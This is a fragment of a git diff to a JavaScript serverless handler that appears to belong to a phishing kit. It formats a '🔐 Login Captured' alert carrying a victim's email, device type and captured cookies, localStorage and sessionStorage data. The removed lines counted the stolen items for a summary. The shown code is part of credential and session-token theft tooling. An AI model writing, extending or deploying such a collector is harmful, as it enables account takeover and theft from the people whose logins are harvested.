@@ -130,29 +130,6 @@ export const handler = async (event, context) => {
     // Clean, minimal message format
     const deviceInfo = /Mobile|Android|iPhone|iPad/.test(userAgent) ? '📱 Mobile' : '💻 Desktop';
     
-    // Count actual data for summary
-    let cookieCount = 0;
-    let localStorageCount = 0;
-    let sessionStorageCount = 0;
-
-    try {
-      if (cookieInfo !== 'No cookies found') {
-        cookieCount = Object.keys(JSON.parse(cookieInfo)).length;
-      }
-    } catch (e) { /* ignore */ }
-
-    try {
-      if (localStorageInfo !== 'Empty') {
-        localStorageCount = Object.keys(JSON.parse(localStorageInfo)).length;
-      }
-    } catch (e) { /* ignore */ }
-
-    try {
-      if (sessionStorageInfo !== 'Empty') {
-        sessionStorageCount = Object.keys(JSON.parse(sessionStorageInfo)).length;
-      }
-    } catch (e) { /* ignore */ }
-
     const message = `🔐 Login Captured
 
 📧 ${email}
